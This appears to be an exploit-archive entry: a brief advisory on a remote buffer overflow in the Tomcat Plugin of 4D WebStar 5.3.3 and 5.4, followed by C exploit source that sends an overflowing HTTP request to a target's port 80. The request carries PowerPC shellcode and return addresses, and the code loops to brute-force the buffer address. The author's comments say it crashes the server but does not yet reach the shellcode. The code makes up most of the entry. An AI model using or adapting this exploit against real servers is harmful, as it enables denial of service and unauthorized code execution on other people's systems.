source: http://www.securityfocus.com/bid/13538/info

The Tomcat Plugin supplied with the HTTP server is reportedly prone to a remote buffer overflow vulnerability.

A successful attack can result in a crash or arbitrary code execution allowing the attacker to gain unauthorized access to the affected computer.

The Tomcat Plugin is enabled by default.

4D WebStar 5.3.3 and 5.4 were reported to be vulnerable. 

/* 4d buffer overflow
Braden Thomas

    the buffer is copied byte by byte starting from the beginning of
the buffer
        until a NULL byte is reached (or a couple other types of bytes)
    the buffer is copied from a pointer that resides past the end of
the buffer
    the buffer can overflow over this pointer, allowing the program
to read bytes to wherever it wants

    -the exploit must restore this pointer or risk reading from null
memory, terminating overflow
    -the pointer is different each time, though it's location in
relation to the buffer is static (buffer+1285)
    -the pointer is overwritten byte by byte, meaning that one wrong
byte, and we're reading from
            somewhere else... which can be potentially bad in terms
of exploitation

    method:
    -exploit attempts to: overwrite the pointer so that the memory
will continue to be overflowed
        (i.e., do not point into any memory that contains a null byte)
    -exploit attempts to continue overflowing with return addresses,
to overflow where LR is stored
    -when loop ends and LR is restored, it will return execution
into the buffer and into shellcode
    -some looping has been added, where BUFADDR is enumerated to try
to brute force the overflow
        because failed servers are respawned

    results:
        actually successful in moving the execution pointer about 10
to 25% of the time
        unsuccessful in actually jumping to the nops/shellcode :(

    problems I don't understand:
        occasionally other threads crash in weird places (memcpy and
szone_malloc)...
            this might actually be when it works as desired and
doesn't crash... but other threads do crash
            before shellcode can do its magic!
            (but that's just a hypothesis)  :)
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/time.h>

unsigned char shellcode[]=    // no 0x00 0x20 0x3f 0x24 0x2f
"\x7c\x63\x1a\x79\x40\x82\xff\xfd\x7d\xa8\x02\xa6\x38\xc3\xe1\x35"
"\x39\x80\x01\x18\x39\xad\x1f\xff\x81\xcd\xe1\x39\x81\xed\xe1\x35"
"\x7d\xef\x72\x78\x91\xed\xe1\x35\x7c\x06\x68\xac\x7c\x01\x04\xac"
"\x7c\x06\x6f\xac\x4c\x01\x01\x2c\x39\xad\xff\xfc\x39\x8c\xff\xfb"
"\x7d\x8c\x63\x79\x40\x82\xff\xd8\x3b\xe0\x30\xff\x7f\xe0\x4e\x70"
"\x44\xff\xff\x02\x7c\x63\x1a\x79\x7c\x63\x1a\x79\x7c\x63\x1a\x79"
"\x10\x29\x25\xcb\x10\xc9\x25\xc8\x10\xe9\x25\xcf\x10\x49\x25\xa8"
"\x6c\x49\x25\xcb\x54\x49\x27\xb1\x54\x37\x3e\xb1\x60\x49\x25\xc4"
"\x28\x4b\x3e\xf0\x28\x49\x25\xc9\x54\xc1\x27\x6f\x10\xe9\x25\xd9"
"\x10\x49\x25\xa1\x57\x8a\xd6\xb1\x6c\x49\x25\xcb\x54\x49\x27\xb1"
"\x10\x49\x25\xa3\x57\x8a\xd6\xb1\x6c\x49\x25\xcb\x54\x49\x27\xb1"
"\x57\x8a\xd6\xb1\x10\x49\x25\xd7\x10\xc9\x25\xd9\xb8\xc8\xda\x21"
"\x10\xe8\xda\x21\x10\xc8\xda\x39\x6c\x49\x25\xcb\x54\x49\x27\xb1"
"\x54\x37\x3e\xb1\x10\xe9\x25\xcb\x10\x49\x25\x93\x57\x8a\xd6\xb1"
"\x54\xed\x0e\xb1\x6c\x49\x25\xcb\x54\x49\x27\xb1\x10\xec\xda\x36"
"\x04\x4c\xda\x36\x68\xcb\xda\x2c\x10\x49\x25\x8b\x6c\x49\x25\xcb"
"\x54\x49\x27\xb1\x54\xec\x0f\xb0\x68\xcb\xda\x34\x54\x21\x27\x6f"
"\x10\x2a\x25\xe1\xb8\x28\xda\x31\xb8\xe8\xda\x35\x10\xc8\xda\x31"
"\x10\x49\x25\xf2\x54\x49\x21\x65\x6c\x49\x25\xcb\x54\x49\x27\xb1"
"\x57\xa9\x25\xc1\x07\x2b\x4c\xa7\x07\x2a\x56\xa1\x28\x49\x25\xc9"
"\x28\x49\x25\xc9";

#define BUFSIZE 1400
long BUFADDR= 0x284fe04;//0x02850204;

int main(int argc, char *argv[])
{
    printf("4d WebSTAR buffer overflow\n");
    printf("\tBraden Thomas\n");

    if (argc<2)
    {
        printf("4dbo <target>\n");
        return 1;
    }

    struct sockaddr_in their_addr;
    their_addr.sin_family = AF_INET;
    their_addr.sin_port = htons(80);
    inet_aton(argv[1], &(their_addr.sin_addr));
    memset(&(their_addr.sin_zero), '\0', 8);


    int count=0;
    while (1)
    {

        char buffer[BUFSIZE];

        // [nops][shellcode][ret addrs][readaddr][more ret addrs]

        memset(buffer,0x60,sizeof(buffer));    // nops first

        int shellcodeLen = sizeof(shellcode)-1;
        memset(shellcode,'A',shellcodeLen);                // just
for testing!

        memcpy(buffer+400+5,shellcode,shellcodeLen);    // next
shellcode


        unsigned long retaddr = BUFADDR + 0x1600;        // as if it
matters... this never works!
        unsigned long *bufPtr = (unsigned long*)(buffer+400
+shellcodeLen+5);        // now for ret addrs
        int bufCnt;
        for (bufCnt=400+shellcodeLen;bufCnt<BUFSIZE;bufCnt+=4)
        {
            memcpy(bufPtr,&retaddr,4);
            bufPtr++;
        }

        unsigned long readaddr = BUFADDR;            // now ptr read
address
                                                    // just a
guess... works pretty well tho
        memcpy(buffer+1285,&readaddr,4);

        memcpy(buffer,"GET /",5);
        char httpStr[]=" HTTP/1.1\r\n\r\n";
        memcpy(buffer+BUFSIZE-sizeof(httpStr),httpStr,sizeof(httpStr));

        if (!count)
            printf("\nRead addr: 0x%x\nReturn addr: 0x%x
\n",readaddr,retaddr);


        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (connect(sockfd, (struct sockaddr *)&their_addr, sizeof
(struct sockaddr)) == -1)
        {
            printf("connect error\n");
            return 1;
        }
        if (send(sockfd, buffer, sizeof(buffer)-1, 0) == -1)
        {
            printf("send error\n");
            return 1;
        }

        struct timeval time;
        fd_set mySet;
        FD_ZERO(&mySet);
        FD_SET(sockfd, &mySet);
        time.tv_sec = 40;
        time.tv_usec = 0;
        if (!select(sockfd+1, &mySet, NULL, NULL, &time))
        {
            printf("\nNo response received.\n");
            break;
        }
        else
        {
            char resBuff[64];
            int readRes = recv(sockfd, resBuff, sizeof(resBuff), 0);
            if (!readRes)
            {
                printf("\nZero length response.\n");
            }
            else if (!(count%21))
                printf("\nResponse length: %d", readRes);
            else
                printf(".");

            count++;

            if (count>=100)
            {
                count=0;
                BUFADDR+=0x200;
                if (BUFADDR>0x285c000)
                    BUFADDR=0x284f204;
            }

        }

        close(sockfd);
    }
    return 0;
}

